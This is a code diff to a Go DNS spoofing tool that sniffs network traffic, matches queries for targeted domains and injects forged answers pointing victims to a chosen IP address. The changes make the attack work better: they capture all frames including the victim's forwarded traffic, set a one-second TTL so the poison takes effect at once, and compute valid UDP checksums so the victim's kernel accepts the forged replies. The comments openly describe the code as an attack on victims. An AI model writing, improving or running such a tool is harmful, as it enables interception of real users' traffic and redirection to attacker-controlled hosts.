@@ -7,6 +7,7 @@ import (
 	"net"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"syscall"
 )
 
@@ -29,13 +30,17 @@ type Poisoner struct {
 	ifaceIndex  int
 }
 
-// PoisonStats tracks DNS poisoning metrics
 type PoisonStats struct {
 	PacketsSniffed    int64
 	DNSQueriesSeen    int64
 	ResponsesInjected int64
 	QueriesIgnored    int64
 }
+
+func (p *Poisoner) incPackets()    { atomic.AddInt64(&p.stats.PacketsSniffed, 1) }
+func (p *Poisoner) incQueries()    { atomic.AddInt64(&p.stats.DNSQueriesSeen, 1) }
+func (p *Poisoner) incInjected()   { atomic.AddInt64(&p.stats.ResponsesInjected, 1) }
+func (p *Poisoner) incIgnored()    { atomic.AddInt64(&p.stats.QueriesIgnored, 1) }
 
 // PoisonerConfig configures the DNS poisoner
 type PoisonerConfig struct {
@@ -104,7 +109,9 @@ func (p *Poisoner) RemoveTarget(domain string) {
 func (p *Poisoner) Start() error {
 	// Open raw socket to sniff all IP traffic (requires root/CAP_NET_RAW)
 	var err error
-	p.rawFD, err = syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(syscall.ETH_P_IP)))
+	// ETH_P_ALL captures ALL ethernet frames on the wire including forwarded victim traffic.
+	// ETH_P_IP would only see packets destined FOR us — we need to see the victim's traffic.
+	p.rawFD, err = syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(0x0003))) // ETH_P_ALL
 	if err != nil {
 		return fmt.Errorf("failed to open raw socket (requires root): %w", err)
 	}
@@ -154,9 +161,12 @@ func (p *Poisoner) Stop() {
 
 // GetStats returns poisoning statistics
 func (p *Poisoner) GetStats() PoisonStats {
-	p.mu.RLock()
-	defer p.mu.RUnlock()
-	return p.stats
+	return PoisonStats{
+		PacketsSniffed:    atomic.LoadInt64(&p.stats.PacketsSniffed),
+		DNSQueriesSeen:    atomic.LoadInt64(&p.stats.DNSQueriesSeen),
+		ResponsesInjected: atomic.LoadInt64(&p.stats.ResponsesInjected),
+		QueriesIgnored:    atomic.LoadInt64(&p.stats.QueriesIgnored),
+	}
 }
 
 // sniffLoop reads raw packets and extracts DNS queries
@@ -175,9 +185,7 @@ func (p *Poisoner) sniffLoop() {
 			continue
 		}
 
-		p.mu.Lock()
-		p.stats.PacketsSniffed++
-		p.mu.Unlock()
+		p.incPackets()
 
 		packet := make([]byte, n)
 		copy(packet, buf[:n])
@@ -239,18 +247,15 @@ func (p *Poisoner) processPacket(packet []byte) {
 		return
 	}
 
-	p.mu.Lock()
-	p.stats.DNSQueriesSeen++
-	p.mu.Unlock()
+	p.incQueries()
 
-	// DNS Header fields
 	txnID := binary.BigEndian.Uint16(dnsPayload[0:2])
 	flags := binary.BigEndian.Uint16(dnsPayload[2:4])
 	isResponse := (flags & 0x8000) != 0
 	qdCount := binary.BigEndian.Uint16(dnsPayload[4:6])
 
 	if isResponse || qdCount == 0 {
-		return // Already a response or no questions
+		return
 	}
 
 	// Parse the query name
@@ -270,9 +275,7 @@ func (p *Poisoner) processPacket(packet []byte) {
 
 	// Check if this domain is in our target list
 	if !p.shouldPoison(normalizedName) {
-		p.mu.Lock()
-		p.stats.QueriesIgnored++
-		p.mu.Unlock()
+		p.incIgnored()
 		return
 	}
 
@@ -294,9 +297,7 @@ func (p *Poisoner) processPacket(packet []byte) {
 	// Inject the forged response
 	p.injectPacket(forgedPacket)
 
-	p.mu.Lock()
-	p.stats.ResponsesInjected++
-	p.mu.Unlock()
+	p.incInjected()
 }
 
 // shouldPoison checks if a domain should be poisoned (exact + subdomain match)
@@ -347,7 +348,7 @@ func (p *Poisoner) forgeDNSResponse(originalQuery []byte, txnID uint16, queryEnd
 	binary.BigEndian.PutUint16(answer[0:2], 0xC00C)   // Name pointer to question
 	binary.BigEndian.PutUint16(answer[2:4], 1)         // Type: A
 	binary.BigEndian.PutUint16(answer[4:6], 1)         // Class: IN
-	binary.BigEndian.PutUint32(answer[6:10], 600)      // TTL: 10 minutes
+	binary.BigEndian.PutUint32(answer[6:10], 1)        // TTL: 1 second — ensures poison takes effect immediately
 	binary.BigEndian.PutUint16(answer[10:12], 4)       // Data length: 4 bytes
 	copy(answer[12:16], p.redirectIP.To4())             // The poisoned IP!
 	resp = append(resp, answer...)
@@ -395,7 +396,11 @@ func (p *Poisoner) buildForgedPacket(
 	binary.BigEndian.PutUint16(udp[0:2], srcPort)          // Source port (53)
 	binary.BigEndian.PutUint16(udp[2:4], dstPort)          // Dest port (victim's)
 	binary.BigEndian.PutUint16(udp[4:6], uint16(udpLen))   // UDP length
-	binary.BigEndian.PutUint16(udp[6:8], 0)                // Checksum (0 = disabled for UDP)
+	// UDP checksum is mandatory for correct delivery; 0 causes receiver kernels to drop.
+	// Compute real checksum over pseudo-header + UDP header + payload.
+	binary.BigEndian.PutUint16(udp[6:8], 0) // zero before computing
+	csum := udpChecksum(srcIP, dstIP, udp[:udpLen])
+	binary.BigEndian.PutUint16(udp[6:8], csum)
 
 	// --- DNS Payload ---
 	copy(udp[8:], dnsPayload)
@@ -453,9 +458,31 @@ func parseDNSName(packet []byte, offset int) (string, int) {
 
 // ipChecksum computes the IP header checksum
 func ipChecksum(header []byte) uint16 {
+	return checksumWords(header)
+}
+
+// udpChecksum computes RFC 768 UDP checksum using the IP pseudo-header.
+// Without this the victim's kernel will silently discard our forged DNS reply.
+func udpChecksum(srcIP, dstIP net.IP, udpSegment []byte) uint16 {
+	// Build pseudo-header: src IP (4) + dst IP (4) + zero (1) + proto=17 (1) + udp length (2)
+	pseudo := make([]byte, 12+len(udpSegment))
+	copy(pseudo[0:4], srcIP.To4())
+	copy(pseudo[4:8], dstIP.To4())
+	pseudo[8] = 0
+	pseudo[9] = 17 // UDP protocol
+	binary.BigEndian.PutUint16(pseudo[10:12], uint16(len(udpSegment)))
+	copy(pseudo[12:], udpSegment)
+	return checksumWords(pseudo)
+}
+
+// checksumWords computes the one's complement checksum over a byte slice
+func checksumWords(data []byte) uint16 {
 	var sum uint32
-	for i := 0; i < len(header); i += 2 {
-		sum += uint32(binary.BigEndian.Uint16(header[i : i+2]))
+	for i := 0; i+1 < len(data); i += 2 {
+		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
+	}
+	if len(data)%2 != 0 {
+		sum += uint32(data[len(data)-1]) << 8
 	}
 	for sum > 0xFFFF {
 		sum = (sum >> 16) + (sum & 0xFFFF)
